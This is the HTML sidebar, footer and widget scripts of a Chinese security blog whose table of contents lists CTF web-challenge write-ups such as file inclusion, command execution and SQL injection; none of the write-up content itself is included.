class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fzsecurity-github"><i class="fab fa-github"></i><span>Come with me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2786245981@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2786245981&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my little world</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp%E2%80%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include%E2%80%93%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95"><span class="toc-text">[ACTF2020 新生赛]Include–文件包含|协议玩法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec%E2%80%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">[ACTF2020 新生赛]Exec–命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping%E2%80%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">[GXYCTF2019]Ping Ping Ping–命令执行|代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E2%80%93SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">[强网杯 2019]随便注–SQL注入|堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">[极客大挑战 2019]Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/06/phpfanxiuNAn/" title="0ctf_2016_unserialize|Recording"><img src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0ctf_2016_unserialize|Recording"/></a><div class="content"><a class="title" href="/2023/11/06/phpfanxiuNAn/" title="0ctf_2016_unserialize|Recording">0ctf_2016_unserialize|Recording</a><time datetime="2023-11-06T09:14:24.000Z" title="发表于 2023-11-06 17:14:24">2023-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/05/WAFno1/" title="WAF绕过"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF绕过"/></a><div class="content"><a class="title" href="/2023/11/05/WAFno1/" title="WAF绕过">WAF绕过</a><time datetime="2023-11-05T12:52:34.000Z" title="发表于 2023-11-05 20:52:34">2023-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/05/neiwang/" title="内网|外网|小姿势"><img src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网|外网|小姿势"/></a><div class="content"><a class="title" href="/2023/11/05/neiwang/" title="内网|外网|小姿势">内网|外网|小姿势</a><time datetime="2023-11-05T04:54:41.000Z" title="发表于 2023-11-05 12:54:41">2023-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/04/my-serve-file/" title="my_serve_file|Record"><img src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="my_serve_file|Record"/></a><div class="content"><a class="title" href="/2023/11/04/my-serve-file/" title="my_serve_file|Record">my_serve_file|Record</a><time datetime="2023-11-04T01:30:16.000Z" title="发表于 2023-11-04 09:30:16">2023-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/29/osTanzhen/" title="漏洞探测发现|os|web|app|api接口|端口|探针"><img src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="漏洞探测发现|os|web|app|api接口|端口|探针"/></a><div class="content"><a class="title" href="/2023/10/29/osTanzhen/" title="漏洞探测发现|os|web|app|api接口|端口|探针">漏洞探测发现|os|web|app|api接口|端口|探针</a><time datetime="2023-10-29T14:27:29.000Z" title="发表于 2023-10-29 22:27:29">2023-10-29</time></div></div></div></div></div></div></main><footer id="footer" style="background: ture"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>成功的花，人们只惊羡她现时的明艳，然而当初她的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。成功不是一时的,而是以日夜的奋斗拼搏出来的。锲而舍之，朽木不折；锲而不舍，金石可镂。朋友们，一起去探索那浩瀚的星辰吧✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">点击开启星辰之旅</a></div></div></div></div></div><div class="ft-item-2"><p class="ft-t">猜你想看💡<ul class="ft-links"><li><a href="/personal/about/">关于作者</a></li><li><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a></li><li><a href="/tags/">文章标签</a></li></ul></p></div></div><div class="copyright"><span><b>&copy;2023</b></span><span><b>&nbsp;&nbsp;By Dralin Feng</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div><div id="workboard"></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script src="/js/jquery.js"></script><script src="/js/sakura.js"></script><script src="/js/foot.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script defer src="/js/runtime.js"></script><script async src="/js/title.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '113.34532,23.15624';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":200,"height":360},"mobile":{"show":false},"rect":{"opacity":0.7},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>